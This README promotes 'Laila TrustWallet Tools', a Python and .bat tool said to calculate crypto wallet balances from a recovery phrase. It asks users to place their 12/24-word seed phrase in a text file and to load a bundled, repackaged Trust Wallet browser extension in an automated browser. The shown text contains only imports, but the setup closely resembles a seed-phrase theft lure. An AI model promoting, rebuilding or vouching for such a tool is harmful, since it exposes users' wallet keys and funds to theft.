# 🔐 Laila TrustWallet Tools

**Laila Auto – Trusted Crypto Wallet & Coin Calculator And Track Balance all coins**

Track and calculate the value of any crypto wallet using only the recovery phrase. This powerful tool is designed to automate balance checking, fetch real-time data, and support any token or coin supported by Trust Wallet.

> 📌 Developed & Published Free by **Laila Khan**  
> 🛡️ © Copyright 2023 – All Rights Reserved

---

## 🌟 What This Tool Can Do

- 🔐 Read wallet info using a **12/24-word seed phrase**
- 📊 Calculate total balance across multiple coins
- 💰 Fetch live market prices and balances
- 🧠 Works with any **Trust Wallet-supported** crypto
- 🖥️ Windows `.bat` launcher install library
- ✅ Simple setup, no advanced tech skills required
- 🧩 Loads Trust Wallet extension in automated browser

---

## 📂 Included Files

| File | Description |
|------|-------------|
| `main.py` | Main script for wallet balance tracking |
| `1.bat` | Windows launcher (double-click to run) |
| `Trust Wallet.zip` | Required browser extension (place in same folder) |
| `phrase.txt` | Add your seed phrase here (demo/testing only) |

---

## ⚙️ Requirements

Make sure you have the following installed:

- ✅ Python 3.8 or higher  
- ✅ `pip` (Python package manager)  
- ✅ Internet connection

---

## 📦 Install Required Python Libraries

The script uses the following Python modules:

```python
import os
import time
import pyperclip 
from playwright.sync_api import sync_playwright
from licensing.methods import Key, Helpers
import colorama
from colorama import Fore, Style
import zipfile
